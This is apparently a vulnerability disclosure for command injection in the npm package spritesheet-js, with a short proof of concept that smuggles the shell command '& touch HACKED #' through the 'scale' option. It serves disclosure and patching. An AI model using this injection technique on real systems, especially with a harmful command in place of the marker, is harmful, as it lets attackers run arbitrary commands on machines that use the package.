# Description

Command Injection in spritesheet-js

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var a =require("spritesheet-js");
a('./', { scale:"& touch HACKED #",trim:true});
```

2. Execute the following commands in terminal:

```
npm i spritesheet-js # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
